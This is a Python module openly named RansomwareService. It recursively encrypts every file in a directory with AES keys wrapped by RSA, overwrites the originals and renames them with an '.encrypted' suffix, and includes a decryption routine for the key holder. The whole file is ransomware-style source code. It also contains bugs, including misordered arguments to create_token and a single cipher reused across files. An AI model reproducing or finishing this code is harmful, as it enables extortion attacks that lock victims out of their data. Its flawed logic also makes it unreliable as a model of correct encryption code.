import os
from pathlib import Path
from typing import List, Literal, Optional, Tuple, Union

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

from . import DefaultService
from .rsa import EncryptionData


class RansomwareService(DefaultService):
    def __init__(self, passphrase: Optional[str] = None):
        super().__init__("ransomware", os.path.join(os.getcwd(), "temp"))

        self.byte_size = 2048

        if passphrase and len(passphrase): 
            self.passphrase = passphrase
        
        self.secret_key = None
        self.token = None
        self.key = None
        self.cipher = None
        self.session_cipher  = None


    def create_token(
        self, 
        file_name: str, 
        passphrase: Optional[str] = None,
        root: Optional[str] = None
    ):
        root = root if root and len(root) else self.root
        if not file_name or not len(file_name):
            return
        
        if passphrase and len(passphrase):
            self.key = RSA.import_key(self.read_file(file_name, "r", root).read(), passphrase=passphrase)
        else:
            self.key = RSA.import_key(self.read_file(file_name, "r", root).read())
        
        self.secret_key = get_random_bytes(32)
        self.token = self.get_base64(self.secret_key)
        self.cipher = PKCS1_OAEP.new(self.key)
        self.encrypted_secret_key = self.cipher.encrypt(self.secret_key)
        self.session_cipher = AES.new(self.secret_key, AES.MODE_EAX)
    

    def encrypt_dir(
        self,
        dir_name: str,
        key_file: str,
        passphrase: Optional[str] = None,
        root: Optional[str] = None,
        key_file_root: Optional[str] = None
    ):
        key_file_root = key_file_root if key_file_root and len(key_file_root) else self.root
        if not key_file or not len(key_file) or not os.path.isfile(os.path.join(key_file_root, key_file)):
            return None
        root = root if root and len(root) else self.root
        path = os.path.join(root, dir_name)
        if (not dir_name or not len(dir_name) or not os.path.isdir(path)):
            return None
        files: Optional[List[str]] = self.read_dir(dir_name, root)
        if not len(files):
            return False
        self.create_token(key_file, key_file_root, passphrase)
        for file, dir in files:
            ed = self.encrypt(self.read_file(file, "r", dir).read())
            with self.write_file(file, "wb", dir) as f:
                [f.write(self.get_bytes(x)) for x in (
                    ed["secret_token"], 
                    ed["nonce"],
                    ed["tag"],
                    ed["ct"]
                )]
            os.rename(os.path.join(dir, file), os.path.join(dir, file+".encrypted"))
        return True
            
        
    def read_dir(
        self, 
        dir_name: str, 
        root: Optional[str] = None,
        encrypted: Optional[bool] = False
    ) -> Optional[List[Tuple[str, str]]]:
        path = os.path.join(root if root and len(root) else self.root, dir_name)
        if not os.path.isdir(path):
            return None
        entries = []
        __entries = os.scandir(path)
        for entry in __entries:
            if entry.is_file():
                path = str(Path(entry))
                if encrypted and path.endswith(".encrypted"):
                    entries.append((os.path.basename(path), os.path.dirname(path)))
                elif not encrypted:
                    entries.append((os.path.basename(path), os.path.dirname(path)))
            else:
                entries.extend(self.read_dir(entry.path, path))
        return entries

    
    def encrypt(
        self,
        data: str,
        key_type: Union[Literal["pk"], Literal["sk"]] = "pk",
    ):
        print(data)
        data = bytes(data, self.encoding)
        ct, tag = self.session_cipher.encrypt_and_digest(data)
        return EncryptionData( 
            ct=self.get_base64(ct),
            tag=self.get_base64(tag),
            nonce=self.get_base64(self.session_cipher.nonce),
            key_type=key_type,
            secret_token=self.get_base64(self.encrypted_secret_key)
        )

    def decrypt_dir(
        self,
        dir_name: str,
        key_file: str,
        passphrase: Optional[str] = None,
        root: Optional[str] = None,
        key_file_root: Optional[str] = None 
    ):
        key_file_root = key_file_root if key_file_root and len(key_file_root) else self.root
        if not key_file or not len(key_file) or not os.path.isfile(os.path.join(key_file_root, key_file)):
            return None
        root = root if root and len(root) else self.root
        path = os.path.join(root, dir_name)
        if (not dir_name or not len(dir_name) or not os.path.isdir(path)):
            return None
        files: Optional[List[Tuple[str, str]]] = self.read_dir(dir_name, root, True)
        if not len(files):
            return False
        if passphrase and len(passphrase):
            self.key = RSA.import_key(self.read_file(key_file, "r", key_file_root).read(), passphrase=passphrase)
        else:
            self.key = RSA.import_key(self.read_file(key_file, "r", key_file_root).read())
        self.cipher = PKCS1_OAEP.new(self.key)
        for file, dir in files:
            with self.read_file(file, "rb", dir) as f:
                sk, nonce, tag, ct = [f.read(x) for x in (self.key.size_in_bytes(), 16, 16, -1)]
            secret_key = self.cipher.decrypt(sk)
            cipher = AES.new(secret_key, AES.MODE_EAX, nonce=nonce)
            data = cipher.decrypt_and_verify(ct, tag)
            with self.write_file(file, "wb", dir) as f:
                f.write(data)
            os.rename(os.path.join(dir, file), os.path.join(dir, file[:file.index(".encrypted")]))
        return True